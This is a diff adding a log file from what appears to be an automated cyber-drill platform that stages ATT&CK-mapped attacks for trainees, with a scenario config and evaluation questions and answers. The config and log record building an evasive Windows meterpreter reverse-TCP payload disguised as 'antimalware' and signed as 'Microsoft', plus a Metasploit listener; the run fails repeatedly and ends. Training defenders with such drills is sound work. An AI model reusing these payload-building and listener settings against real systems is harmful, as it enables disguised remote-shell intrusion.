@@ -1,0 +1,176 @@
+2020-06-01 21:01:08,491- session-for-5ed5263e051e140dbc0be36d - INFO - Property Not Found
+2020-06-01 21:01:19,027- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Parsing Scenario....................
+2020-06-01 21:01:19,033- session-for-5ed5263e051e140dbc0be36d - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 5, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}]
+2020-06-01 21:01:19,035- session-for-5ed5263e051e140dbc0be36d - INFO - *****************************Check tools status*****************************
+2020-06-01 21:01:19,035- session-for-5ed5263e051e140dbc0be36d - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible']
+2020-06-01 21:01:19,036- session-for-5ed5263e051e140dbc0be36d - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-06-01 21:01:19,037- session-for-5ed5263e051e140dbc0be36d - INFO - ansible = [32mTrue[0m
+2020-06-01 21:01:19,038- session-for-5ed5263e051e140dbc0be36d - INFO - msfconsole = [32mTrue[0m
+2020-06-01 21:01:19,039- session-for-5ed5263e051e140dbc0be36d - INFO - ansible = [32mTrue[0m
+2020-06-01 21:01:19,039- session-for-5ed5263e051e140dbc0be36d - INFO - ************************Updating Session Tactics**********************
+2020-06-01 21:01:19,045- session-for-5ed5263e051e140dbc0be36d - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-06-01 21:01:19,051- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 21:01:19,052- session-for-5ed5263e051e140dbc0be36d - INFO - Reason: payload generation
+2020-06-01 21:01:29,586- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 1
+2020-06-01 21:01:30,245- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 2
+2020-06-01 21:01:30,803- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 2
+2020-06-01 21:01:32,363- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert payload number: 3
+2020-06-01 21:01:32,520- session-for-5ed5263e051e140dbc0be36d - INFO - Press Enter to continue: 
+2020-06-01 21:01:32,677- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 21:01:32,729- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert LPORT: 33365
+2020-06-01 21:01:32,781- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert output filename: antimalware
+2020-06-01 21:01:33,333- session-for-5ed5263e051e140dbc0be36d - INFO - Add multiple processes behaviour: n
+2020-06-01 21:01:34,582- session-for-5ed5263e051e140dbc0be36d - INFO - Strip executable\?: y
+2020-06-01 21:01:36,151- session-for-5ed5263e051e140dbc0be36d - INFO - Sign executable\?: y
+2020-06-01 21:01:36,203- session-for-5ed5263e051e140dbc0be36d - INFO - use already existing certificate: y
+2020-06-01 21:01:36,255- session-for-5ed5263e051e140dbc0be36d - INFO - Select a Certificate: 1
+2020-06-01 21:01:36,307- session-for-5ed5263e051e140dbc0be36d - INFO - Insert sign software description: Microsoft
+2020-06-01 21:01:37,599- session-for-5ed5263e051e140dbc0be36d - INFO - Press Enter to continue: 
+2020-06-01 21:01:38,057- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 0
+2020-06-01 21:01:38,058- session-for-5ed5263e051e140dbc0be36d - INFO - **************************Exploring Evaluation**********************
+2020-06-01 21:01:38,059- session-for-5ed5263e051e140dbc0be36d - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-06-01 21:01:38,059- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 21:01:49,344- session-for-5ed5263e051e140dbc0be36d - INFO - **************************Exploring Evaluation**********************
+2020-06-01 21:01:49,344- session-for-5ed5263e051e140dbc0be36d - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-06-01 21:01:49,344- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 21:01:49,349- session-for-5ed5263e051e140dbc0be36d - INFO - No Exceptions Found
+2020-06-01 21:01:49,382- session-for-5ed5263e051e140dbc0be36d - INFO - post not needed
+2020-06-01 21:01:49,411- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LHOST'] not needed...
+2020-06-01 21:01:49,411- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LPORT'] not needed...
+2020-06-01 21:01:49,450- session-for-5ed5263e051e140dbc0be36d - INFO - cid: 12
+2020-06-01 21:01:49,450- session-for-5ed5263e051e140dbc0be36d - INFO - Starting Another Thread
+2020-06-01 21:01:49,450- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 21:01:51,364- metasploit-thread - INFO - {'job_id': 18, 'uuid': 'wmzy2ctu'}
+2020-06-01 21:01:51,370- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:01:54,382- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:01:54,455- session-for-5ed5263e051e140dbc0be36d - INFO - **************************Exploring Evaluation**********************
+2020-06-01 21:01:54,456- session-for-5ed5263e051e140dbc0be36d - INFO - Appending Generalize questions_answers
+2020-06-01 21:01:54,456- session-for-5ed5263e051e140dbc0be36d - INFO - Appending scenario-specific questions_answers
+2020-06-01 21:01:54,456- session-for-5ed5263e051e140dbc0be36d - INFO - *****************************Questions*****************************
+2020-06-01 21:01:54,456- session-for-5ed5263e051e140dbc0be36d - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-01 21:01:54,457- session-for-5ed5263e051e140dbc0be36d - INFO - *****************************Actual Answers*****************************
+2020-06-01 21:01:54,457- session-for-5ed5263e051e140dbc0be36d - INFO - ['192.168.18.61', 33365, '%USERPROFILE%\\Downloads\\', 'antimalware']
+2020-06-01 21:01:54,462- session-for-5ed5263e051e140dbc0be36d - INFO - evaluation id:5ed5263e051e140dbc0be36e
+2020-06-01 21:01:54,462- session-for-5ed5263e051e140dbc0be36d - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 21:01:54,469- session-for-5ed5263e051e140dbc0be36d - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-01 21:01:54,469- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 21:01:54,495- session-for-5ed5263e051e140dbc0be36d - INFO - command is antimalware.exe
+2020-06-01 21:01:54,496- session-for-5ed5263e051e140dbc0be36d - CRITICAL - Exception Occured somewhere!!
+2020-06-01 21:01:54,496- session-for-5ed5263e051e140dbc0be36d - INFO - [Errno 2] No such file or directory: '/home/FYP/-B-Drill/Attack-Machine/Automated_Tools/execute_windows_command.yml'
+2020-06-01 21:01:54,496- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Going 1 step back........................
+2020-06-01 21:01:54,501- session-for-5ed5263e051e140dbc0be36d - INFO - Exception Successfully Raised
+2020-06-01 21:01:54,501- session-for-5ed5263e051e140dbc0be36d - INFO - Exception caught
+2020-06-01 21:01:54,501- session-for-5ed5263e051e140dbc0be36d - INFO - No Exceptions Found
+2020-06-01 21:01:54,528- session-for-5ed5263e051e140dbc0be36d - INFO - post not needed
+2020-06-01 21:01:54,544- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LHOST'] not needed...
+2020-06-01 21:01:54,544- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LPORT'] not needed...
+2020-06-01 21:01:54,564- session-for-5ed5263e051e140dbc0be36d - INFO - cid: 13
+2020-06-01 21:01:54,564- session-for-5ed5263e051e140dbc0be36d - INFO - Starting Another Thread
+2020-06-01 21:01:54,564- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 21:01:56,354- metasploit-thread - INFO - {'job_id': 19, 'uuid': 'l4eauwpd'}
+2020-06-01 21:01:56,360- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:01:59,373- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:01:59,570- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 21:01:59,576- session-for-5ed5263e051e140dbc0be36d - INFO - command is antimalware.exe
+2020-06-01 21:01:59,576- session-for-5ed5263e051e140dbc0be36d - CRITICAL - Exception Occured somewhere!!
+2020-06-01 21:01:59,577- session-for-5ed5263e051e140dbc0be36d - INFO - [Errno 2] No such file or directory: '/home/FYP/-B-Drill/Attack-Machine/Automated_Tools/execute_windows_command.yml'
+2020-06-01 21:01:59,577- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Going 2 step back........................
+2020-06-01 21:01:59,582- session-for-5ed5263e051e140dbc0be36d - INFO - Exception Successfully Raised
+2020-06-01 21:01:59,582- session-for-5ed5263e051e140dbc0be36d - INFO - Exception caught
+2020-06-01 21:02:06,638- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 21:02:06,770- session-for-5ed5263e051e140dbc0be36d - INFO - No Exceptions Found
+2020-06-01 21:02:06,824- session-for-5ed5263e051e140dbc0be36d - INFO - post not needed
+2020-06-01 21:02:06,840- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LHOST'] not needed...
+2020-06-01 21:02:06,840- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LPORT'] not needed...
+2020-06-01 21:02:06,857- session-for-5ed5263e051e140dbc0be36d - INFO - cid: 14
+2020-06-01 21:02:06,857- session-for-5ed5263e051e140dbc0be36d - INFO - Starting Another Thread
+2020-06-01 21:02:06,858- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 21:02:08,844- metasploit-thread - INFO - {'job_id': 20, 'uuid': 'nwstmret'}
+2020-06-01 21:02:08,849- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:02:11,868- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 21:02:11,875- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:02:11,904- session-for-5ed5263e051e140dbc0be36d - INFO - command is antimalware.exe
+2020-06-01 21:02:11,904- session-for-5ed5263e051e140dbc0be36d - CRITICAL - Exception Occured somewhere!!
+2020-06-01 21:02:11,904- session-for-5ed5263e051e140dbc0be36d - INFO - [Errno 2] No such file or directory: '/home/FYP/-B-Drill/Attack-Machine/Automated_Tools/execute_windows_command.yml'
+2020-06-01 21:02:11,905- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Going 3 step back........................
+2020-06-01 21:02:11,908- session-for-5ed5263e051e140dbc0be36d - INFO - Exception Successfully Raised
+2020-06-01 21:02:11,908- session-for-5ed5263e051e140dbc0be36d - INFO - Exception caught
+2020-06-01 21:02:12,009- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 21:02:12,010- session-for-5ed5263e051e140dbc0be36d - INFO - Reason: payload generation
+2020-06-01 21:02:12,010- session-for-5ed5263e051e140dbc0be36d - INFO - ['LPORT'] option not needed...
+2020-06-01 21:02:22,516- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 1
+2020-06-01 21:02:23,176- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 2
+2020-06-01 21:02:23,734- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 2
+2020-06-01 21:02:25,295- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert payload number: 3
+2020-06-01 21:02:25,452- session-for-5ed5263e051e140dbc0be36d - INFO - Press Enter to continue: 
+2020-06-01 21:02:25,609- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 21:02:25,660- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert LPORT: 33365
+2020-06-01 21:02:25,712- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert output filename: antimalware
+2020-06-01 21:02:26,264- session-for-5ed5263e051e140dbc0be36d - INFO - Add multiple processes behaviour: n
+2020-06-01 21:02:27,651- session-for-5ed5263e051e140dbc0be36d - INFO - Strip executable\?: y
+2020-06-01 21:02:29,221- session-for-5ed5263e051e140dbc0be36d - INFO - Sign executable\?: y
+2020-06-01 21:02:29,273- session-for-5ed5263e051e140dbc0be36d - INFO - use already existing certificate: y
+2020-06-01 21:02:29,325- session-for-5ed5263e051e140dbc0be36d - INFO - Select a Certificate: 1
+2020-06-01 21:02:29,376- session-for-5ed5263e051e140dbc0be36d - INFO - Insert sign software description: Microsoft
+2020-06-01 21:02:30,666- session-for-5ed5263e051e140dbc0be36d - INFO - Press Enter to continue: 
+2020-06-01 21:02:31,124- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 0
+2020-06-01 21:02:31,125- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 21:02:40,825- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 21:02:40,831- session-for-5ed5263e051e140dbc0be36d - INFO - No Exceptions Found
+2020-06-01 21:02:40,845- session-for-5ed5263e051e140dbc0be36d - INFO - post not needed
+2020-06-01 21:02:40,861- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LHOST'] not needed...
+2020-06-01 21:02:40,861- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LPORT'] not needed...
+2020-06-01 21:02:40,900- session-for-5ed5263e051e140dbc0be36d - INFO - cid: 15
+2020-06-01 21:02:40,900- session-for-5ed5263e051e140dbc0be36d - INFO - Starting Another Thread
+2020-06-01 21:02:40,900- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 21:02:42,679- metasploit-thread - INFO - {'job_id': 21, 'uuid': '6kcmrtje'}
+2020-06-01 21:02:42,686- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:02:45,708- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:02:45,903- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 21:02:45,912- session-for-5ed5263e051e140dbc0be36d - INFO - command is antimalware.exe
+2020-06-01 21:02:45,912- session-for-5ed5263e051e140dbc0be36d - CRITICAL - Exception Occured somewhere!!
+2020-06-01 21:02:45,913- session-for-5ed5263e051e140dbc0be36d - INFO - [Errno 2] No such file or directory: '/home/FYP/-B-Drill/Attack-Machine/Automated_Tools/execute_windows_command.yml'
+2020-06-01 21:02:45,913- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Going 4 step back........................
+2020-06-01 21:02:45,928- session-for-5ed5263e051e140dbc0be36d - INFO - Exception Successfully Raised
+2020-06-01 21:02:45,929- session-for-5ed5263e051e140dbc0be36d - INFO - Exception caught
+2020-06-01 21:02:46,032- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 21:02:46,033- session-for-5ed5263e051e140dbc0be36d - INFO - Reason: payload generation
+2020-06-01 21:02:46,033- session-for-5ed5263e051e140dbc0be36d - INFO - ['LPORT'] option not needed...
+2020-06-01 21:02:56,539- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 1
+2020-06-01 21:02:57,197- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 2
+2020-06-01 21:02:57,755- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 2
+2020-06-01 21:02:59,313- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert payload number: 3
+2020-06-01 21:02:59,470- session-for-5ed5263e051e140dbc0be36d - INFO - Press Enter to continue: 
+2020-06-01 21:02:59,624- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 21:02:59,676- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert LPORT: 33365
+2020-06-01 21:02:59,727- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert output filename: antimalware
+2020-06-01 21:03:00,279- session-for-5ed5263e051e140dbc0be36d - INFO - Add multiple processes behaviour: n
+2020-06-01 21:03:01,691- session-for-5ed5263e051e140dbc0be36d - INFO - Strip executable\?: y
+2020-06-01 21:03:03,261- session-for-5ed5263e051e140dbc0be36d - INFO - Sign executable\?: y
+2020-06-01 21:03:03,313- session-for-5ed5263e051e140dbc0be36d - INFO - use already existing certificate: y
+2020-06-01 21:03:03,364- session-for-5ed5263e051e140dbc0be36d - INFO - Select a Certificate: 1
+2020-06-01 21:03:03,415- session-for-5ed5263e051e140dbc0be36d - INFO - Insert sign software description: Microsoft
+2020-06-01 21:03:04,715- session-for-5ed5263e051e140dbc0be36d - INFO - Press Enter to continue: 
+2020-06-01 21:03:05,173- session-for-5ed5263e051e140dbc0be36d - INFO - Please insert option: 0
+2020-06-01 21:03:05,174- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 21:03:14,729- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 21:03:14,777- session-for-5ed5263e051e140dbc0be36d - INFO - No Exceptions Found
+2020-06-01 21:03:14,807- session-for-5ed5263e051e140dbc0be36d - INFO - post not needed
+2020-06-01 21:03:14,826- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LHOST'] not needed...
+2020-06-01 21:03:14,827- session-for-5ed5263e051e140dbc0be36d - INFO - exploit['LPORT'] not needed...
+2020-06-01 21:03:14,842- session-for-5ed5263e051e140dbc0be36d - INFO - cid: 16
+2020-06-01 21:03:14,842- session-for-5ed5263e051e140dbc0be36d - INFO - Starting Another Thread
+2020-06-01 21:03:14,842- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 21:03:16,660- metasploit-thread - INFO - {'job_id': 22, 'uuid': 'mrvw9fxa'}
+2020-06-01 21:03:16,666- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:03:19,679- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 21:03:19,848- session-for-5ed5263e051e140dbc0be36d - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 21:03:19,854- session-for-5ed5263e051e140dbc0be36d - INFO - command is antimalware.exe
+2020-06-01 21:03:19,855- session-for-5ed5263e051e140dbc0be36d - CRITICAL - Ending Attack due to bulk of errors
+2020-06-01 21:03:19,855- session-for-5ed5263e051e140dbc0be36d - INFO - ************************Raising Incomplete Error Flag and Ending Session**********************
+2020-06-01 21:03:19,860- session-for-5ed5263e051e140dbc0be36d - INFO - Flag raised in attack session.
+2020-06-01 21:03:19,860- session-for-5ed5263e051e140dbc0be36d - CRITICAL - Final Exception, Execution Stopped for session id5ed5263e051e140dbc0be36d
+2020-06-01 21:03:19,861- session-for-5ed5263e051e140dbc0be36d - INFO - Exception Successfully Raised
+2020-06-01 21:03:19,861- session-for-5ed5263e051e140dbc0be36d - INFO - Exception caught
+2020-06-01 21:03:19,862- session-for-5ed5263e051e140dbc0be36d - INFO - ....................Destroying Session.....................................
+2020-06-01 21:03:19,862- session-for-5ed5263e051e140dbc0be36d - INFO - ....................No Session available to destroy........................
